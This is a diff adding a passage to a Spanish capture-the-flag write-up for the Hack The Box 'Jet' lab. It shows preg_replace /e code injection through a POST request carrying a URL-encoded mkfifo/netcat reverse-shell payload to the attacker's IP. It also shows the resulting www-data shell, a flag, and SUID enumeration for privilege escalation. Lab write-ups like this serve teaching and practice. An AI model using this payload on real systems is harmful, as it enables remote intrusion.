@@ -261,10 +261,60 @@ La data esta `urlencodeada` por lo que si la decodificamos `Crtl + Shift + U` ve
 
 Vemos que está utilizando expresiones regulares, es decir `/i` por lo que ya vemos una forma de ejecutar comandos, si cambiamos el /i por `/e` podremos ejecutar comandos de forma remota, con lo cual nos podremos mandar una `reverse shell`.
 
-Para eso reemplazaremos la data por (pero donde pone 10.13.14.13 lo reemplazaras por tu ip de HTB): 
+Para eso primero con `netcat` pondremos el puerto 443 a la escucha y luego reemplazaremos la data por (pero donde pone 10.13.14.13 lo reemplazaras por tu ip de HTB): 
 ```
 swearwords[/fuck/e]=system('rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/bash%20-i%202>%261|nc%2010.13.14.13%20443%20>/tmp/f')&swearwords[/shit/i]=poop&swearwords[/ass/i]=behind&swearwords[/dick/i]=penis&swearwords[/whore/i]=escort&swearwords[/asshole/i]=bad+person&to=uwu@uwu.uwu&subject=uwu&message=uwu&_wysihtml5_mode=1
 ```
+
+Una vez tenemos la el puerto a la escucha le daremos a `Foward` en `Burpsuite` y deberíamos ver lo siguiente en la consola con netcat:
+
+```
+❯ sudo netcat -lvnp 443
+Connection received on 10.13.37.10
+www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$
+```
+
+Ya estamos dentro! Asi que ahora al ver que archivos hay nos encontramos con otra `flag`:
+
+```
+> www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ ls
+a_flag_is_here.txt
+
+> cat a_flag_is_here.txt
+JET{pr3g_r3pl4c3_g3ts_y0u_pwn3d}
+```
+
+Pues ya que estamos vamos a intetar `escalar privilegios`, para eso primero miraremos que archivo tienen privilegios `SUID`:
+
+```
+www-data@jet:~$ find / -perm -4000 2>/dev/null
+
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/snapd/snap-confine
+/usr/bin/chsh
+/usr/bin/newuidmap
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/at
+/usr/bin/newgidmap
+/usr/bin/chfn
+/usr/bin/sudo
+/lib/uncompress.so
+/home/leak
+/bin/umount
+/bin/su
+/bin/fusermount
+/bin/mount
+/bin/ping
+/bin/ntfs-3g
+/bin/ping6
+```
+
 
 ## WEB: puerto 80 | http
 
